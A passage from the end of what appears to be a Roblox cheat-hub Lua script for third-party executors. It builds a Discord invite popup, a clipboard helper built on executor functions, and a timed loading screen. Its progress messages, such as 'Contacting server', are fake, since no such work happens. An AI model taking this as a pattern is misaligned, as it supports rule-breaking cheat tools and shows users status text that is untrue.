    popupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    popupGui.Parent = playerGui

    local popupOverlay = Instance.new("Frame")
    popupOverlay.Size = UDim2.fromScale(1, 1)
    popupOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    popupOverlay.BackgroundTransparency = 0.5
    popupOverlay.BorderSizePixel = 0
    popupOverlay.Parent = popupGui

    local card = _makeCard(popupGui, UDim2.fromOffset(380, 228))
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position = UDim2.new(0.5, 0, 0.34, 0)
    local top = _makeTopBar(card, "Unknown Hub Discord")

    local closeBtn = Instance.new("TextButton")
    closeBtn.Parent = top
    closeBtn.BackgroundColor3 = COLOR_SURFACE
    closeBtn.AutoButtonColor = true
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "X"
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 14
    closeBtn.TextColor3 = COLOR_TEXT
    closeBtn.Size = UDim2.fromOffset(28, 28)
    closeBtn.Position = UDim2.new(1, -34, 0.5, -14)
    local closeBtnCorner = Instance.new("UICorner")
    closeBtnCorner.CornerRadius = UDim.new(0, 8)
    closeBtnCorner.Parent = closeBtn
    local closeStroke = Instance.new("UIStroke")
    closeStroke.Parent = closeBtn
    closeStroke.Thickness = 1
    closeStroke.Transparency = 0.25
    closeStroke.Color = COLOR_STROKE_MAIN

    local body = Instance.new("TextLabel")
    body.Parent = card
    body.BackgroundTransparency = 1
    body.Position = UDim2.new(0, 18, 0, 60)
    body.Size = UDim2.new(1, -36, 0, 76)
    body.Text = "Join to find secret servers\nGet update announcements\nEnter giveaways"
    body.TextWrapped = true
    body.Font = Enum.Font.Gotham
    body.TextSize = 16
    body.TextXAlignment = Enum.TextXAlignment.Center
    body.TextYAlignment = Enum.TextYAlignment.Center
    body.TextColor3 = COLOR_TEXT

    local copyBtn = Instance.new("TextButton")
    copyBtn.Parent = card
    copyBtn.Size = UDim2.new(1, -24, 0, 38)
    copyBtn.Position = UDim2.new(0, 12, 1, -70)
    copyBtn.BackgroundColor3 = COLOR_TEAL_ON
    copyBtn.BorderSizePixel = 0
    copyBtn.Text = "Copy Discord Invite"
    copyBtn.Font = Enum.Font.GothamBlack
    copyBtn.TextSize = 16
    copyBtn.TextColor3 = Color3.fromRGB(14, 25, 38)
    local copyBtnCorner = Instance.new("UICorner")
    copyBtnCorner.CornerRadius = UDim.new(0, 12)
    copyBtnCorner.Parent = copyBtn
    local cpStroke = Instance.new("UIStroke")
    cpStroke.Parent = copyBtn
    cpStroke.Thickness = 1
    cpStroke.Transparency = 0.15
    cpStroke.Color = COLOR_STROKE_MAIN

    local toast = Instance.new("TextLabel")
    toast.Parent = card
    toast.BackgroundTransparency = 1
    toast.Position = UDim2.new(0, 12, 1, -48)
    toast.Size = UDim2.new(1, -24, 0, 16)
    toast.Text = ""
    toast.Font = Enum.Font.Gotham
    toast.TextSize = 12
    toast.TextXAlignment = Enum.TextXAlignment.Center
    toast.TextColor3 = COLOR_TEXT_MUTED

    local function copyToClipboard(text)
        if type(text) ~= "string" then return false end
        if setclipboard and type(setclipboard) == "function" then if pcall(setclipboard, text) then return true end end
        if toclipboard and type(toclipboard) == "function" then if pcall(toclipboard, text) then return true end end
        if syn and type(syn) == "table" and type(syn.write_clipboard) == "function" then if pcall(syn.write_clipboard, text) then return true end end
        return false
    end

    copyBtn.MouseButton1Click:Connect(function()
        if copyToClipboard(DISCORD_LINK) then
            toast.Text = "Invite link copied to clipboard."
        else
            toast.Text = "Clipboard not supported. Link: "..DISCORD_LINK
        end
    end)

    local function closePopup()
        config.__UnknownHubDiscordShown = true
        saveConfigHard()
        popupGui:Destroy()
    end

    closeBtn.MouseButton1Click:Connect(closePopup)
    popupOverlay.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then closePopup() end
    end)

    card.Size = UDim2.fromOffset(0, 0)
    TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(380, 228)}):Play()
end

-- ═══════════════════════════════════════════════════════════════
-- LOADING SEQUENCE -> DISCORD -> SHOW HUB
-- ═══════════════════════════════════════════════════════════════
spawn(function()
    local steps = {
        {p = 0.1, s = "Checking executor...", sub = "Verifying compatibility"},
        {p = 0.25, s = "Loading configuration...", sub = "Reading saved settings"},
        {p = 0.4, s = "Initializing modules...", sub = "Loading core systems"},
        {p = 0.55, s = "Loading UI components...", sub = "Building interface"},
        {p = 0.7, s = "Setting up features...", sub = "Preparing toggles & sliders"},
        {p = 0.85, s = "Checking for updates...", sub = "Contacting server"},
        {p = 1.0, s = "Complete!", sub = "Ready"},
    }
    
    for i, step in ipairs(steps) do
        if loadingDestroyed then break end
        pcall(function()
            progressFill.Size = UDim2.fromScale(step.p, 1)
            statusLabel.Text = step.s
            loadingSub.Text = step.sub
        end)
        wait(0.4)
    end
    
    -- 1. Destroy loading screen completely
    wait(0.2)
    DestroyLoading()
    
    -- 2. Show discord popup if needed
    wait(0.3)
    if not firstShownFlag then
        pcall(ShowDiscordPopup)
    end
    
    -- 3. Show the main hub menu
    wait(0.2)
    hubMain.Visible = true
    hubVisible = true
    hubMinimized = false
end)

_G.UnknownHub = {
    Toggle = ToggleHub,
    Minimize = MinimizeHub,
    IsVisible = function() return hubVisible end
}

print("[Unknown Hub] Loaded successfully!")
print("[Unknown Hub] Keybind: RightShift")
